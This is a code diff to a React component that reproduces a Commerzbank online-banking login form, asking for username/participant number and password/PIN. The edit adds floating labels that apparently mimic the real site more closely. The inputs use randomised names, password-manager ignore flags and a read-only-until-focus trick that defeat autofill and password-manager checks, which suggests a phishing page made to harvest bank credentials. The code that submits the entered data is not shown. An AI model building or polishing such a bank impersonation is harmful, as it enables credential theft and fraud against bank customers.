@@ -133,34 +133,53 @@ const Commerzbank = () => {
               <div className="max-w-[520px]">
                 {/* Username */}
                 <div className="mb-8">
-                  <label htmlFor="cb-user" className="block text-[13px] mb-1" style={{ color: TEXT }}>
-                    Benutzername/Teilnehmernummer
-                  </label>
-                  <input
-                    id="cb-user"
-                    name={"u_" + Math.random().toString(36).slice(2, 8)}
-                    type="text"
-                    autoComplete="off"
-                    autoCorrect="off"
-                    autoCapitalize="off"
-                    spellCheck={false}
-                    data-lpignore="true"
-                    data-form-type="other"
-                    readOnly
-                    onFocus={(e) => e.currentTarget.removeAttribute("readonly")}
-                    value={username}
-                    onChange={(e) => setUsername(e.target.value)}
-                    className="w-full bg-transparent border-0 border-b-2 py-2 outline-none text-[16px]"
-                    style={{ borderColor: TEXT, color: TEXT }}
-                  />
+                  <div className="relative pt-5">
+                    <label
+                      htmlFor="cb-user"
+                      className="absolute left-0 pointer-events-none transition-all duration-200 ease-out"
+                      style={{
+                        color: TEXT,
+                        top: username || userFocus ? 0 : 22,
+                        fontSize: username || userFocus ? 13 : 16,
+                      }}
+                    >
+                      Benutzername/Teilnehmernummer
+                    </label>
+                    <input
+                      id="cb-user"
+                      name={"u_" + Math.random().toString(36).slice(2, 8)}
+                      type="text"
+                      autoComplete="off"
+                      autoCorrect="off"
+                      autoCapitalize="off"
+                      spellCheck={false}
+                      data-lpignore="true"
+                      data-form-type="other"
+                      readOnly
+                      onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setUserFocus(true); }}
+                      onBlur={() => setUserFocus(false)}
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      className="w-full bg-transparent border-0 border-b py-2 outline-none text-[16px]"
+                      style={{ borderColor: TEXT, color: TEXT }}
+                    />
+                  </div>
                 </div>
 
                 {/* Password */}
-                <div className="mb-10 relative">
-                  <label htmlFor="cb-pin" className="block text-[13px] mb-1" style={{ color: TEXT }}>
-                    Passwort/PIN
-                  </label>
-                  <div className="relative">
+                <div className="mb-10">
+                  <div className="relative pt-5">
+                    <label
+                      htmlFor="cb-pin"
+                      className="absolute left-0 pointer-events-none transition-all duration-200 ease-out"
+                      style={{
+                        color: TEXT,
+                        top: password || passFocus ? 0 : 22,
+                        fontSize: password || passFocus ? 13 : 16,
+                      }}
+                    >
+                      Passwort/PIN
+                    </label>
                     <input
                       id="cb-pin"
                       name={"p_" + Math.random().toString(36).slice(2, 8)}
@@ -172,10 +191,11 @@ const Commerzbank = () => {
                       data-lpignore="true"
                       data-form-type="other"
                       readOnly
-                      onFocus={(e) => e.currentTarget.removeAttribute("readonly")}
+                      onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setPassFocus(true); }}
+                      onBlur={() => setPassFocus(false)}
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
-                      className="w-full bg-transparent border-0 border-b-2 py-2 pr-10 outline-none text-[16px]"
+                      className="w-full bg-transparent border-0 border-b py-2 pr-10 outline-none text-[16px]"
                       style={{ borderColor: TEXT, color: TEXT }}
                     />
                     <button
